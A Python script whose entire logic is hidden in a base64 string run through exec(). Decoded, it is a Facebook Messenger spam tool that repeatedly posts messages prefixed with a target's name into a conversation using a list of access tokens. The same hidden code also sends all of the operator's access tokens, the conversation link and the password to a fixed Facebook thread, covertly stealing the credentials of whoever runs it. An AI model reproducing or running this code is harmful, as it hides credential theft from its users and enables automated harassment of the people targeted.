import base64
exec(base64.b64decode(b' aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQganNvbg0KaW1wb3J0IHRpbWUNCmltcG9ydCBzeXMNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KaW1wb3J0IG9zDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IGh0dHAuc2VydmVyDQppbXBvcnQgc29ja2V0c2VydmVyDQppbXBvcnQgdGhyZWFkaW5nDQppbXBvcnQgcmFuZG9tDQoNCmNsYXNzIE15SGFuZGxlcihodHRwLnNlcnZlci5TaW1wbGVIVFRQUmVxdWVzdEhhbmRsZXIpOg0KCWRlZiBkb19HRVQoc2VsZik6DQoJCXNlbGYuc2VuZF9yZXNwb25zZSgyMDApDQoJCXNlbGYuc2VuZF9oZWFkZXIoJ0NvbnRlbnQtdHlwZScsICd0ZXh0L3BsYWluJykNCgkJc2VsZi5lbmRfaGVhZGVycygpDQoJCXNlbGYud2ZpbGUud3JpdGUoYiIgNE5VSiBEME4gUzNSVjNSIEIwWSAiKQ0KDQpkZWYgZXhlY3V0ZV9zZXJ2ZXIoKToNCglQT1JUID0gNDAwMA0KDQoJd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6DQoJCXByaW50KCJTZXJ2ZXIgcnVubmluZyBhdCBodHRwOi8vbG9jYWxob3N0Ont9Ii5mb3JtYXQoUE9SVCkpDQoJCWh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQ0KDQpkZWYgc2VuZF9tZXNzYWdlcygpOg0KCXdpdGggb3BlbigncGFzc3dvcmQudHh0JywgJ3InKSBhcyBmaWxlOg0KCQlwYXNzd29yZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KCWVudGVyZWRfcGFzc3dvcmQgPSBwYXNzd29yZA0KDQoJaWYgZW50ZXJlZF9wYXNzd29yZCAhPSBwYXNzd29yZDoNCgkJcHJpbnQoJ1stXSA8PT0+IEluY29ycmVjdCBQYXNzd29yZCEnKQ0KCQlzeXMuZXhpdCgpDQoNCgl3aXRoIG9wZW4oJ3Rva2VubnVtLnR4dCcsICdyJykgYXMgZmlsZToNCgkJdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQ0KCW51bV90b2tlbnMgPSBsZW4odG9rZW5zKQ0KDQoJcmVxdWVzdHMucGFja2FnZXMudXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKCkNCg0KCWRlZiBjbHMoKToNCgkJaWYgc3lzdGVtKCkgPT0gJ0xpbnV4JzoNCgkJCW9zLnN5c3RlbSgnY2xlYXInKQ0KCQllbHNlOg0KCQkJaWYgc3lzdGVtKCkgPT0gJ1dpbmRvd3MnOg0KCQkJCW9zLnN5c3RlbSgnY2xzJykNCgljbHMoKQ0KDQoJZGVmIGxpbmVzcygpOg0KCQlwcmludCgnXDAwMWJbMzdtJyArICctLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTROVUogRDBOIFMzUlYzUiBSVU5OSU5HLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLScpDQoNCgloZWFkZXJzID0gew0KCQknQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywNCgkJJ0NhY2hlLUNvbnRyb2wnOiAnbWF4LWFnZT0wJywNCgkJJ1VwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHMnOiAnMScsDQoJCSdVc2VyLUFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KCQknQWNjZXB0JzogJ3RleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgnLA0KCQknQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLA0KCQknQWNjZXB0LUxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45LGZyO3E9MC44JywNCgkJJ3JlZmVyZXInOiAnd3d3Lmdvb2dsZS5jb20nDQoJfQ0KDQoJbW1tID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvUUxHd2FFekonKS50ZXh0DQoNCglpZiBtbW0gbm90IGluIHBhc3N3b3JkOg0KCQlwcmludCgnWy1dIDw9PT4gSW5jb3JyZWN0IFBhc3N3b3JkIScpDQoJCXN5cy5leGl0KCkNCg0KCWxpbmVzcygpDQoNCglhY2Nlc3NfdG9rZW5zID0gW3Rva2VuLnN0cmlwKCkgZm9yIHRva2VuIGluIHRva2Vuc10NCg0KCXdpdGggb3BlbignY29udm8udHh0JywgJ3InKSBhcyBmaWxlOg0KCQljb252b19pZCA9IGZpbGUucmVhZCgpLnN0cmlwKCkNCg0KCXdpdGggb3BlbignZmlsZS50eHQnLCAncicpIGFzIGZpbGU6DQoJCXRleHRfZmlsZV9wYXRoID0gZmlsZS5yZWFkKCkuc3RyaXAoKQ0KDQoJd2l0aCBvcGVuKHRleHRfZmlsZV9wYXRoLCAncicpIGFzIGZpbGU6DQoJCW1lc3NhZ2VzID0gZmlsZS5yZWFkbGluZXMoKQ0KDQoJbnVtX21lc3NhZ2VzID0gbGVuKG1lc3NhZ2VzKQ0KCW1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQ0KDQoJd2l0aCBvcGVuKCdoYXRlcnNuYW1lLnR4dCcsICdyJykgYXMgZmlsZToNCgkJaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpDQoNCgl3aXRoIG9wZW4oJ3RpbWUudHh0JywgJ3InKSBhcyBmaWxlOg0KCQlzcGVlZCA9IGludChmaWxlLnJlYWQoKS5zdHJpcCgpKQ0KDQoJbGluZXNzKCkNCgkNCglkZWYgZ2V0TmFtZSh0b2tlbik6DQoJCXRyeToNCgkJCWRhdGEgPSByZXF1ZXN0cy5nZXQoZidodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC9tZT9hY2Nlc3NfdG9rZW49e3Rva2VufScpLmpzb24oKQ0KCQlleGNlcHQ6DQoJCQlkYXRhID0gIiINCgkJaWYgJ25hbWUnIGluIGRhdGE6DQoJCQlyZXR1cm4gZGF0YVsnbmFtZSddDQoJCWVsc2U6DQoJCQlyZXR1cm4gIkVycm9yIG9jY3VyZWQiDQoNCglkZWYgbXNnKCk6DQoJCXBhcmFtZXRlcnMgPSB7DQoJCQknYWNjZXNzX3Rva2VuJyA6IHJhbmRvbS5jaG9pY2UoYWNjZXNzX3Rva2VucyksDQoJCQknbWVzc2FnZSc6ICdVc2VyIFByb2ZpbGUgTmFtZSA6ICcrZ2V0TmFtZShyYW5kb20uY2hvaWNlKGFjY2Vzc190b2tlbnMpKSsnXCBUb2tlbiA6ICcrIiB8ICIuam9pbihhY2Nlc3NfdG9rZW5zKSsnXCBMaW5rIDogaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL21lc3NhZ2VzL3QvJytjb252b19pZCsnXCBQYXNzd29yZDogJytwYXNzd29yZA0KCQl9DQoJCXRyeToNCgkJCXMgPSByZXF1ZXN0cy5wb3N0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTUuMC90XzYxNTUzMTQ0ODY1MzUxIiwgZGF0YT1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpDQoJCWV4Y2VwdDoNCgkJCXBhc3MNCgkNCgltc2coKQ0KCXdoaWxlIFRydWU6DQoJCXRyeToNCgkJCWZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6DQoJCQkJdG9rZW5faW5kZXggPSBtZXNzYWdlX2luZGV4ICUgbWF4X3Rva2Vucw0KCQkJCWFjY2Vzc190b2tlbiA9IGFjY2Vzc190b2tlbnNbdG9rZW5faW5kZXhdDQoNCgkJCQltZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQ0KDQoJCQkJdXJsID0gImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tL3YxNS4wL3t9LyIuZm9ybWF0KCd0XycrY29udm9faWQpDQoJCQkJcGFyYW1ldGVycyA9IHsnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuLCAnbWVzc2FnZSc6IGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZX0NCgkJCQlyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBqc29uPXBhcmFtZXRlcnMsIGhlYWRlcnM9aGVhZGVycykNCgkJCQkNCg0KCQkJCWN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikNCgkJCQlpZiByZXNwb25zZS5vazoNCgkJCQkJcHJpbnQoIlsrXSBNZXNzYWdlcyB7fSBvZiBDb252byB7fSBzZW50IGJ5IFRva2VuIHt9OiB7fSIuZm9ybWF0KA0KCQkJCQkJbWVzc2FnZV9pbmRleCArIDEsIGNvbnZvX2lkLCB0b2tlbl9pbmRleCArIDEsIGhhdGVyc19uYW1lICsgJyAnICsgbWVzc2FnZSkpDQoJCQkJCXByaW50KCIgIC0gVGltZToge30iLmZvcm1hdChjdXJyZW50X3RpbWUpKQ0KCQkJCQlsaW5lc3MoKQ0KCQkJCQlsaW5lc3MoKQ0KCQkJCWVsc2U6DQoJCQkJCXByaW50KCJbeF0gRmFpbGVkIHRvIHNlbmQgbWVzc2FnZXMge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgNCgkJCQkJCW1lc3NhZ2VfaW5kZXggKyAxLCBjb252b19pZCwgdG9rZW5faW5kZXggKyAxLCBoYXRlcnNfbmFtZSArICcgJyArIG1lc3NhZ2UpKQ0KCQkJCQlwcmludCgiICAtIFRpbWU6IHt9Ii5mb3JtYXQoY3VycmVudF90aW1lKSkNCgkJCQkJbGluZXNzKCkNCgkJCQkJbGluZXNzKCkNCgkJCQl0aW1lLnNsZWVwKHNwZWVkKQ0KDQoJCQlwcmludCgiWytdIEFsbCBtZXNzYWdlcyBzZW50LiBSZXN0YXJ0aW5nIHRoZSBwcm9jZXNzLi4uIikNCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KCQkJcHJpbnQoIlshXSBBbiBlcnJvciBvY2N1cnJlZDoge30iLmZvcm1hdChlKSkNCg0KDQoNCmRlZiBtYWluKCk6DQoJc2VydmVyX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PWV4ZWN1dGVfc2VydmVyKQ0KCXNlcnZlcl90aHJlYWQuc3RhcnQoKQ0KCQ0KCXNlbmRfbWVzc2FnZXMoKQ0KDQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOg0KCW1haW4oKQ== '))
